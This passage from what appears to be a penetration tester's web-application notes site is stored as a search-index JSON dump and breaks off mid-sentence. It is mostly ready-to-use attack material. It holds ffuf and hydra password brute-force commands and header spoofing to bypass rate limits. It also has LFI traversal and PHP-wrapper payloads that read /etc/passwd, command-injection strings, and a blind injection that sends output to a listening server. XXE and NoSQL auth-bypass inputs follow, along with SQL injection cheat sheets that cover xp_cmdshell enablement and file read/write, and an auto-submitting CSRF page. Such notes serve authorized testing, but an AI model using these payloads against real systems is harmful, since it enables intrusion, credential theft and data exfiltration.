<li>Map entire auth flow / attack surface</li> <li>Proxy requests, target a functionality, step through entire process, then review every step in the chain via the proxy requests.</li> <li>Create multiple accounts for testing</li> <li>Check for brute-force protection</li> <li>Is the application using a standard library?</li> <li>Logic Flaws</li> <li>Inspect tokens</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/-%20Getting%20Started/#wordlist-resources","title":"Wordlist Resources","text":"<ul> <li>https://wordlists.assetnote.io/</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Brute%20Forcing%20Authentication/","title":"Brute Forcing Authentication","text":"<p>ffuf - Save request \u201ccopy to file\u201d from burp - Replace \u201cpassword\u201d param with \u201cFUZZ\u201d - Run with no filter, determine invalid response size, add <code>fs &lt;SIZE&gt;</code> , re-run command <pre><code>ffuf -request r.txt -fs &lt;SIZE&gt; -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt:FUZZ\n</code></pre> fuff - fuzz all permutations of multiple parameters (clusterbomb) - Modify the request with two keywords, append them to the proper wordlists <pre><code>ffuf -request r.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt:FUZZPASS -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER\n</code></pre> hydra <pre><code>hydra -V -L ../wordlists/users.txt -P ../wordlists/pass.txt 192.168.187.133 http-get-form \"/dvwa/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Username and/or password incorrect.:H=Cookie\\: PHPSESSID=XXXXX; security=low\"\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Brute%20Forcing%20Authentication/#user-enumeration","title":"User Enumeration","text":"<ul> <li>Check if response is different for failed username vs failed password</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Brute%20Forcing%20Authentication/#timing-technique","title":"Timing technique:","text":"<ul> <li>Attempt usernames with an extremely long password<ul> <li>Does the application take longer to check the password when the username is valid? </li> <li>Check response times !</li> </ul> </li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Multi-Factor%20Authentication/","title":"Multi Factor Authentication","text":"<p>General things to look for:</p> <ul> <li>Forceful Browsing</li> <li>Changing parameters</li> <li>Changing body content</li> <li>Are thing predictable?</li> <li>Backup codes present?</li> <li>Same code, multiple accounts?</li> <li>Can we trigger an error/weird behavior</li> <li>Can you skip steps in the MFA flow?</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Rate%20Limiting/","title":"Rate Limiting","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Rate%20Limiting/#identify-rate-limiting-technique","title":"Identify rate limiting technique","text":"<p>Potential:</p> <ul> <li>Headers?</li> <li>User agents?</li> <li>Cookies? Session tokens?</li> <li>HTTP verb tamperng?</li> <li>Decrease amount and speed of requests?</li> </ul> <p>Quick win headers: <pre><code>X-Real-IP:\nX-Forwarded-For:\nX-Originating-IP:\nClient-IP:\nTrue-Client-IP:\n</code></pre> 1st, get yourself rate limited, then send a request with these headers, check bypass <pre><code>POST / HTTP/2\nHost: jacobh.io\nSec-Ch-Ua: \"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Linux\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nX-Real-IP: 1.2.3.4\nX-Forwarded-For: 1.2.3.4\nX-Originating-IP: 1.2.3.4\nClient-IP: 1.2.3.4\nTrue-Client-IP: 1.2.3.4\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n</code></pre> Also try localhost <pre><code>X-Real-IP: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nClient-IP: 127.0.0.1\nTrue-Client-IP: 127.0.0.1\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Session%20Tokens/","title":"Session Tokens","text":"<p>Determine if a token warrents further investigation</p> <ul> <li>send multiple requests with valid login to login endpoint<ul> <li>Do tokens change?</li> <li>Is any part of the token static? </li> </ul> </li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Session%20Tokens/#burp-sequencer","title":"Burp Sequencer","text":"<ul> <li>Sequencer will allow you to request many tokens and automatically assess their entropy. </li> <li>Sequencer identifies some patterns in a token, we should spend time investigating that token further.</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Filter%20Bypasses/","title":"Filter Bypasses","text":"<p>Things to consider:</p> <ul> <li>Are filters applied recursively ?</li> <li>Insufficient character blacklist</li> <li>Not using allow lists</li> <li>Can it properly handle encoded payloads?</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Filter%20Bypasses/#basic","title":"Basic","text":"<p>Non-recursive filter bypass <pre><code>http://example.com/read.php?file=..././..././..././..././..././..././etc/passwd\n</code></pre> Mangle capitals &amp; operators for filter bypasses <pre><code>http://example.com/read.php?file=..././..././..././..././..././..././eTc/p+AsS+wd\n</code></pre> Play with the characters, determine if certain characters are being stripped out, you may be able to abuse the order at which chars are stripped out. for example: if <code>$</code> is being filtered out at the last step of the process, you may be able to split your payload with that characters, with it being reconstructed post filter. <pre><code>/.$./.$./.$./etc/passwd\n</code></pre> becomes: <pre><code>/../../../etc/passwd\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Filter%20Bypasses/#php-wrappers","title":"PHP Wrappers","text":"<p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md</p> <ul> <li>Leak php code instead of executing it. <pre><code>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\nhttp://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php\nhttp://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php\n</code></pre></li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/File%20Inclusion/Local%20File%20Inclusion%20%28LFI%29/","title":"Local File Inclusion (LFI)","text":"<p>note</p> <p>Try to exploit 1st by replacing the expected value, then by appending your payload after the expected value. If you see a path <code>/var/www/images/5.jpg</code> we may need to insert our payload not at the root, but instead of 5.jpg - the application may be expecting the preceding path to exist in the request. </p> <p>List of payloads https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</p> <p>ffuf - Copy request to file via burp <pre><code>ffuf -request r -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt\n</code></pre> Filter by wordcount <pre><code>ffuf -request r -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 19,20\n</code></pre></p> <p>List of most common LFI parameters <pre><code>?cat={payload}\n?dir={payload]\n?action={payload}\n?board={payload}\n?date={payload}\n?detail={payload}\n?file={payload}\n?download={payload}\n?path={payload}\n?folder={payload}\n?prefix={payload}\n?include={payload}\n?page={payload]\n?inc={payload}\n?locate={payload}\n?show={payload}\n?doc={payload}\n?site={payload}\n?type={payload}\n?view={payload}\n?content={payload}\n?document={payload}\n?layout={payload}\n?mod={payload}\n?conf={payload}\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Command%20Injection/","title":"Command Injection","text":"<p>https://book.hacktricks.xyz/pentesting-web/command-injection Payloads <pre><code>; whoami\n</code></pre> <pre><code>; whoami ;\n</code></pre> <pre><code>; whoami ; #\n</code></pre> Close logic via our controlled input, then execute <pre><code> awk 'BEGIN {print sqrt(((-2)^2) + ((-3)^2))}'\n</code></pre> <pre><code>3)^2))}';whoami;#\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Command%20Injection/#blind","title":"Blind","text":"<p><pre><code>http://LOCALHIP&gt;:PORT/?=`whoami`\n</code></pre> Response on listening server: <pre><code>HEAD /?=www-data HTTP/1.1\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/External%20Entity%20Injection%20%28XXE%29/","title":"External Entity Injection (XXE)","text":"<p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</p> <p>Check:</p> <ul> <li>XXE if an application references XML formatted data.</li> <li>If you think an endpoint is only accepting JSON, try to switch to XML and check if the application still accepts it.</li> <li>SVG uploads (try even if the form says png only)</li> <li>DOCX uploads</li> </ul> <p>Potential impact</p> <ul> <li>View files on target server</li> <li>SSRF</li> <li>Exfiltrate Data</li> </ul> <p>Basic payload - file inclusion</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE data [\n&lt;!ELEMENT data (\\#ANY)&gt;\n&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;data&gt;&amp;file;&lt;/data&gt;\n</code></pre> <p>Ensure you\u2019re following the applications expected format</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE creds [\n&lt;!ELEMENT creds ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;password&gt;pass&lt;/password&gt;&lt;/creds&gt;\n</code></pre> <p>File Upload Intercept image upload, change content type header, and file extension to svg <pre><code>Content-Type: image/svg+xml\n</code></pre> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg </p> <p>Via XInclude Request is sending data in payload, we can potentially replace the data with XInclude to achieve file inclusion Payload <pre><code>&lt;foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"&gt;\n&lt;xi:include parse=\"text\" href=\"file:///etc/passwd\"/&gt;&lt;/foo&gt;\n</code></pre> </p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/NoSQL%20Injection/","title":"NoSQL Injection","text":"<p>SQL but without tables. MongoDB is most popular.  more common, with <code>MongoDB</code> now being the 5th most used database engine (as of November 2022). The way <code>NoSQL</code> databases store data varies significantly across the different categories and implementations.</p> Type Description Top 3 Engines (as of November 2022) Document-Oriented Database Stores data in <code>documents</code> which contain pairs of <code>fields</code> and <code>values</code>. These documents are typically encoded in formats such as <code>JSON</code> or <code>XML</code>. MongoDB, Amazon DynamoDB, Google Firebase - Cloud Firestore Key-Value Database A data structure that stores data in <code>key:value</code> pairs, also known as a <code>dictionary</code>. Redis, Amazon DynamoDB, Azure Cosmos DB Wide-Column Store Used for storing enormous amounts of data in <code>tables</code>, <code>rows</code>, and <code>columns</code> like a relational database, but with the ability to handle more ambiguous data types. Apache Cassandra, Apache HBase, Azure Cosmos DB Graph Database Stores data in <code>nodes</code> and uses <code>edges</code> to define relationships. Neo4j, Azure Cosmos DB, Virtuoso ## MongoDB ___ MongoDB Usage cheatsheet: https://www.mongodb.com/developer/products/mongodb/cheat-sheet/#connect-mongodb-shell <p>Mongo uses query operators to interact and compare fields. Here are some examples: query operators.</p> Type Operator Description Example Comparison <code>$eq</code> Matches values which are <code>equal to</code> a specified value <code>type: {$eq: \"Pink Lady\"}</code> Comparison <code>$gt</code> Matches values which are <code>greater than</code> a specified value <code>price: {$gt: 0.30}</code> Comparison <code>$gte</code> Matches values which are <code>greater than or equal to</code> a specified value <code>price: {$gte: 0.50}</code> Comparison <code>$in</code> Matches values which exist <code>in the specified array</code> <code>type: {$in: [\"Granny Smith\", \"Pink Lady\"]}</code> Comparison <code>$lt</code> Matches values which are <code>less than</code> a specified value <code>price: {$lt: 0.60}</code> Logical <code>$not</code> Matches documents which <code>do not meet the conditions</code> of a specified query <code>type: {$not: {$eq: \"Granny Smith\"}}</code> Evaluation <code>$regex</code> Matches values which <code>match a specified RegEx</code> <code>type: {$regex: /^G.*/}</code> ### Basic Injection Example --- Auth Bypass Normal data: <pre><code>email=test@test.com&amp;password=test\n</code></pre> Becomes: <pre><code>email[$ne]=test@test.com&amp;password[$ne]=test\n</code></pre> This will evaluate to TRUE (unless the values actually exist) and bypass auth. OR match anything and always eval to true: <pre><code>email[$regex]=.*&amp;password[$regex]=.*\n</code></pre> Data Extraction Ways can match ALL data from an injection point and return it: - <code>name: {$ne: 'doesntExist'}</code>: Assuming <code>doesntExist</code> doesn't match any documents' names, this will match all documents. - <code>name: {$gt: ''}</code>: This matches all documents whose name is 'bigger' than an empty string. - <code>name: {$gte: ''}</code>: This matches all documents whose name is 'bigger or equal to' an empty string. - <code>name: {$lt: '~'}</code>: This compares the first character of <code>name</code> to a Tilde character and matches if it is 'less'. This will not always work, but it works in this case because Tilde is the largest printable ASCII value, and we know that all names in the collection are composed of ASCII characters. - <code>name: {$lte: '~'}</code>: Same logic as above, except it additionally matches documents whose names start with <code>~</code>."},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/NoSQL%20Injection/#server-side-javascript-injection","title":"Server-Side JavaScript Injection","text":"<p>Execute arbitrary JavaScript in the context of the database. Auth bypass  we could set <code>username</code> to <code>\" || true || \"\"==\"</code>, which should result in the query statement always returning <code>True</code>, regardless of what <code>this.username</code> and <code>this.password</code> are. </p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/","title":"SQL Injection","text":"<p>note</p> <p>Think outside the box for injectable parameters. Anything that could be passed to a db is worth testing against. ie UAs, cookies, etc\u2026</p> <p>note</p> <p>when fuzzing for SQL injection, try 1. replacing valid data with payloads, 2. appending payloads to the end of valid data</p> <p>note</p> <p>Be very careful with SQL injection payloads, likely potential for DOS, ask for permission if you find something.</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#key-delimiters-and-enclosures","title":"Key Delimiters and Enclosures","text":"<ul> <li><code>'</code>, <code>\"</code>: Standard string delimiters. E.g., <code>' OR '1'='1</code></li> <li><code>\\\\: MySQL identifier quoting. E.g.,</code> column <code>= 'value'</code> `</li> <li><code>;</code>: Statement separator. E.g., <code>SELECT * FROM users; DROP TABLE users;</code></li> <li><code>-</code>, <code>/*...*/</code>: SQL comments. E.g., <code>-comment</code>, <code>/* comment */</code></li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#injection-patterns","title":"Injection Patterns","text":"<ul> <li>Basic Injection: <code>' OR 1=1--</code></li> <li>Closing Brackets: Try closing out functions or statements. E.g., <code>')</code>, <code>'))</code>, <code>')))--</code>, <code>%'))-- -</code></li> <li>Logical Operators: <code>OR</code>, <code>AND</code>. E.g., <code>' OR 'x'='x</code></li> <li>Union Injection: <code>' UNION SELECT ... --</code></li> <li>Conditional Time Delays (for blind SQLi):<ul> <li>MySQL: <code>'; SELECT SLEEP(5);--</code></li> <li>MSSQL: <code>'; WAITFOR DELAY '00:00:05';--</code></li> <li>Oracle: <code>'; dbms_lock.sleep(5);--</code></li> <li>PostgreSQL: <code>'; SELECT pg_sleep(5);--</code></li> </ul> </li> <li>Out-of-Band: Through DNS or HTTP. E.g., DNS lookup triggered by SQL query.</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#enumerate-db-type","title":"Enumerate DB Type","text":"<p>https://portswigger.net/web-security/sql-injection/cheat-sheet</p> <p>PostgreSQL:     <code>SELECT pg_sleep(10)</code> MySQL:  <code>SELECT SLEEP(10)</code> Oracle:     <code>dbms_pipe.receive_message(('a'),10)</code> Microsoft:  <code>WAITFOR DELAY '0:0:10'</code></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#automated","title":"Automated","text":"<p>See SQLMap cheat sheet</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#cheat-sheet-per-db-type","title":"Cheat Sheet Per DB Type","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#basic","title":"Basic","text":"<p>Logical or <pre><code>' OR 1=1-- -\n</code></pre> Union - Enum number of columns <pre><code>' union select null#\n' union select null,null#\n' union select null,null,null#\n</code></pre> Now that you know number of columns, return any query results <pre><code>' union select null,null,version()#\n</code></pre> <pre><code>' union select null,null,table_name from information_schema.tables#\n</code></pre> <pre><code>' union select null,null,&lt;COLUMN&gt; from &lt;TABLE&gt;#\n</code></pre> Column types must match in union select. <pre><code>' union select null(int),1,null,null from &lt;table&gt;#\n</code></pre> https://portswigger.net/web-security/sql-injection/cheat-sheet</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#blind","title":"Blind","text":"<p>manual logical value extraction - Compare results against passed char, if response does not change, we have a valid char <pre><code>Cookie: session=2345234r346326sdfsg' and substring((select version()), 1, 1) = '7'#\n</code></pre> <pre><code>Cookie: session=2345234r346326sdfsg' and substring((select version()), 1, 2) = '7.'#\nCookie: session=2345234r346326sdfsg' and substring((select version()), 1, 3) = '7.0'#\nCookie: session=2345234r346326sdfsg' and substring((select version()), 1, 5) = '7.0.3'#\n</code></pre> sqlmap <pre><code>sqlmap -r r --level=2\n</code></pre> <pre><code>sqlmap -r r --level=2 --dump\n</code></pre> <pre><code>sqlmap -r r --level=2 -T &lt;TABLENAME&gt; --dump\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#second-order","title":"Second-order","text":"<p>Injection achieved when query is executed not at the injection point, but when the query is retrieved. - Signup endpoint, you signup with the user <code>' or 1=1-- -</code> and the query only returns data when you navigate to the \u201caccounts\u201d page after your user is created.</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#mssql","title":"MSSQL","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-databases","title":"List databases","text":"<p>Normal <pre><code>Select name from sys.databases\n</code></pre> Error based <pre><code>cast((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)\n</code></pre> Union Based <pre><code>' UNION SELECT name, NULL FROM master..sysdatabases --\n</code></pre> Stacked Queries <pre><code>; SELECT name FROM master..sysdatabases; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-tables","title":"List Tables:","text":"<p>Normal <pre><code>select * from app.information_schema.tables;\n</code></pre> Error based` <pre><code>cast((SELECT TABLE_NAME FROM exercise.information_schema.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) as integer)\n</code></pre> Union Based <pre><code>' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables --\n</code></pre> Stacked Queries <pre><code>; SELECT * FROM information_schema.tables; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-columns","title":"List columns","text":"<p>Normal <pre><code>select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';\n</code></pre> Error based <pre><code>cast((SELECT+column_name+FROM+exercise.information_schema.columns+where+table_name+%3d+'secrets'+ORDER+BY+name+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY)+as+integer)\n</code></pre> Union Based <pre><code>' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE TABLE_NAME = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'table_name'; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#command-execution","title":"Command Execution","text":"<p>Normal</p> <p>To use <code>xp_cmdshell</code> for command execution, it first needs to be enabled by a user with administrative privileges: <pre><code>EXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n</code></pre> After enabling, you can execute system commands like so: <pre><code>EXEC xp_cmdshell 'your_command_here';\n</code></pre></p> <p>SQLi Just like before, you will need to enable the privs first, sometimes they may be enabled by default: <pre><code>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --\n</code></pre> <pre><code>'; EXEC xp_cmdshell 'your_command_here'; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#mysql","title":"MYSQL","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-databases_1","title":"List databases","text":"<p>Normal <pre><code>SHOW DATABASES;\n</code></pre></p> <p>Error based (32 character limit) <pre><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1)))--\n</code></pre> Union Based <pre><code>' UNION SELECT schema_name, NULL FROM information_schema.schemata --\n</code></pre> Stacked Queries: <pre><code>; SHOW DATABASES; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-tables_1","title":"List Tables","text":"<p>Normal <pre><code>SHOW TABLES;\n</code></pre> Error based <pre><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name' LIMIT 1 OFFSET 1)))--\n</code></pre></p> <p>Union Based <pre><code>' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = 'database_name' --\n</code></pre> Stacked Queries: <pre><code>; SHOW TABLES; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-columns_1","title":"List columns","text":"<p>Normal <pre><code>SHOW COLUMNS FROM table_name;\n</code></pre> Error based <pre><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1)))--\n</code></pre></p> <p>Union Based <pre><code>' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SHOW COLUMNS FROM table_name; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#read-files","title":"Read Files:","text":"<p>Normal <pre><code>SELECT LOAD_FILE('/path/to/file');\n</code></pre> SQLi <pre><code>' UNION SELECT LOAD_FILE('/path/to/file'), NULL --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#write-files","title":"Write Files:","text":"<p>Normal <pre><code>SELECT * INTO OUTFILE '/path/to/file' FROM table_name;\n</code></pre> SQLi <pre><code>' UNION SELECT column_name FROM table_name INTO OUTFILE '/path/to/file' --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#postgres","title":"Postgres","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-databases_2","title":"List databases","text":"<p>Normal <pre><code>SELECT datname FROM pg_database;\n</code></pre> Error based <pre><code>' (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 1) AS integer))--\n</code></pre> Union Based <pre><code>' UNION SELECT datname, NULL FROM pg_database --\n</code></pre> Stacked Queries <pre><code>; SELECT datname FROM pg_database; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-tables_2","title":"List Tables:","text":"<p>Normal <pre><code>SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';\n</code></pre> Error based <pre><code>' (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1) AS integer))--\n</code></pre> Union Based <pre><code>' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --\n</code></pre> Stacked Queries: <pre><code>; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-columns_2","title":"List columns:","text":"<p>Normal <pre><code>SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';\n</code></pre> Error based <pre><code>' (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1) AS integer))--\n</code></pre> Union Based <pre><code>' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#read-files_1","title":"Read Files:","text":"<p>Normal <pre><code>SELECT pg_read_file('/path/to/file', 0, 1000000);\n</code></pre> SQLi <pre><code>' UNION SELECT pg_read_file('/path/to/file', 0, 1000000), NULL --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#write-files_1","title":"Write Files:","text":"<p>Normal <pre><code>COPY table_name TO '/path/to/file' DELIMITER ',' CSV HEADER;\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#oracle","title":"ORACLE","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-databases_3","title":"List databases:","text":"<p>Normal <pre><code>SELECT name FROM v$database;\n</code></pre></p> <p>Error based <pre><code>' AND (SELECT COUNT(*) FROM v$database) --\n</code></pre> Union Based <pre><code>' UNION SELECT name, NULL FROM v$database --\n</code></pre> Stacked Queries: <pre><code>; SELECT name FROM v$database; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-tables_3","title":"List Tables:","text":"<p>Normal <pre><code>SELECT table_name FROM all_tables;\n</code></pre> Error based <pre><code>' AND (SELECT COUNT(*) FROM all_tables) --\n</code></pre> Union Based <pre><code>' UNION SELECT table_name, NULL FROM all_tables --\n</code></pre> Stacked Queries: <pre><code>; SELECT table_name FROM all_tables; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/SQL%20Injection/#list-columns_3","title":"List columns:","text":"<p>Normal <pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name';\n</code></pre> Error based <pre><code>' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'table_name') --\n</code></pre> Union Based <pre><code>' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name'; --\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Injections/Server-Side%20Template%20Injection%20%28SSTI%29/","title":"Server Side Template Injection (SSTI)","text":"<p>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection 1. First try to generate an error to leak the templating engine 2. Use hacktricks payloads for execution</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Request%20Forgery/Cross-Site%20Request%20Forgery%20%28CSRF%29/","title":"Cross Site Request Forgery (CSRF)","text":"<ul> <li>Checklist<ul> <li>Does every form have a CSRF token?</li> <li>Can we use GET instead of POST (i.e. can our payload be in the URI instead of the body)<ul> <li>Test the token</li> <li>Test without the token</li> </ul> </li> <li>Test other HTTP methods without the token (e.g. GET)</li> <li>Test without the token value (keep the param name, e.g. &amp;csrf=)</li> <li>Test with a random token</li> <li>Test a previous token</li> <li>Test a token from a different session</li> <li>Test with a token of the same length</li> <li>Test for predictability<ul> <li>Test for static values</li> </ul> </li> <li>Test for known values (e.g. the token is the user-id)</li> <li>Is the token tied to a cookie other than the session cookie?</li> <li>Can the token be stolen with XSS?</li> <li>Is the referer header being used to validate the request origin?<ul> <li>Do the cookies have SameSite set? (Chrome is lax by default)</li> </ul> </li> <li>Can we submit the request with GET?</li> <li>Can we override HTTP methods with <code>X-Http-Method-Override: GET</code><ul> <li>Can we override HTTP methods with <code>_method=POST</code> <pre><code>&lt;!-- original payload generated from BURP Suite Pro --&gt;\n&lt;html&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"https://&lt;target-site&gt;/api/employees/add\" method=POST&gt;\n      &lt;input type=\"hidden\" name=\"name\" value=\"&lt;payload-info&gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"&lt;payload-info&gt;\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <pre><code>&lt;!-- requires user interaction --&gt;\n&lt;a href=\"http://&lt;target-site&gt;m/api/employees/add?name=&lt;payload-info&gt;\"&gt;Click Me&lt;/a&gt;\n</code></pre> <pre><code>&lt;!-- doesn't require user interaction --&gt;\n&lt;img src=\"http:/&lt;target-site&gt;/api/employees/add?name=&lt;payload-info&gt;\"&gt;\n</code></pre> <pre><code>document.location = 'https://&lt;target-site&gt;/employees/add?name=&lt;payload-info&gt;';\n</code></pre></li> </ul> </li> </ul> </li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Request%20Forgery/Server%20Side%20Request%20Forgery/","title":"Server Side Request Forgery","text":"<p>Force the server to make a request to an arbitrary endpoint.</p> <p>Things to assess: - Have a referrer header? Try blind 